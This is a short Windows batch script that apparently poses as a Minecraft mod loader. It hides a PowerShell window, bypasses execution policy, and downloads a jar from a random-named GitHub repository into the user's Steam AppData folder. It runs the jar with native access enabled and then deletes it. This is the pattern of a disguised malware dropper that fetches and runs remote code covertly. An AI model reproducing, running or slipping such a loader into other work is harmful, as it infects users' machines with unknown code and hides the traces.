@echo off
setlocal

set "JAR_DIR=C:\Users\klobz\AppData\Local\Steam"
set "JAR_PATH=%JAR_DIR%\local.jar"
set "URL=https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/local.jar"

if not exist "%JAR_DIR%" mkdir "%JAR_DIR%"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%JAR_PATH%' -UseBasicParsing"

if not exist "%JAR_PATH%" (
    echo Failed to download local.jar
    pause
    exit /b 1
)

java --enable-native-access=ALL-UNNAMED -jar "%JAR_PATH%"

del "%JAR_PATH%" /f /q
endlocal
